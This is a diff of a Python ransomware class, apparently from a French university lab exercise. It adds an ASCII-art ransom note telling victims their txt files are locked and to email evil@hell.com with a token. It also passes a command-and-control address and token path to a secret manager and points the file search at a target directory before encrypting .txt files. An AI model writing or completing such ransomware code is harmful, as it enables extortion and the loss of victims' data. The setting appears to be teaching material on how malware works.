@@ -9,7 +9,18 @@ import os
 CNC_ADDRESS = "cnc:6666"
 TOKEN_PATH = "/root/token"
 
+ENCRYPT_MESSAGE = """
+  _____                                                                                           
+ |  __ \                                                                                          
+ | |__/ | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
+ |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
+ | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
+ |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_| \___/|_| |_|\___|\__,|
+                | |                      __/ |                                               __/ |
+                |_|                     |___/                                               |___/ 
 
+Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
+"""
 
 class Ransomware:
     def __init__(self) -> None:
@@ -29,8 +40,8 @@ class Ransomware:
         #raise NotImplemented()
     
     def get_files(self, filter_str: str) -> list:
-        #répertoire dù on va rechercher les fichiers
-        base_path = Path('/Downloads/TD')
+        #répertoire où on va rechercher les fichiers
+        base_path = Path('/root/ransomware')
 
         # rechercher les fichiers 
         matching_files = list(base_path.rglob(filter_str))
@@ -45,6 +56,7 @@ class Ransomware:
         #raise NotImplemented()
 
     def encrypt(self):
+       
         # Liste les fichiers .txt 
         txt_files = [file for file in os.listdir() if file.endswith('.txt')]
 
@@ -53,8 +65,7 @@ class Ransomware:
             return
 
         # Crée une instance de SecretManager
-        secret_manager = SecretManager()
-
+        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
         # Appelle la méthode setup pour générer la clé et le token
         secret_manager.setup()
 
@@ -64,7 +75,7 @@ class Ransomware:
 
         # Affiche un message avec le token au format hexadécimal
         hex_token = secret_manager.get_hex_token()
-        print("Vos fichiers ont été chiffrés. Contactez l'attaquant avec ce token en format hexadécimal :")
+        print("Vos fichiers ont été chiffrés :")
         print(hex_token)
 
 
@@ -108,6 +119,7 @@ class Ransomware:
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
+    print(sys.argv)
     if len(sys.argv) < 2:
         ransomware = Ransomware()
         ransomware.encrypt()
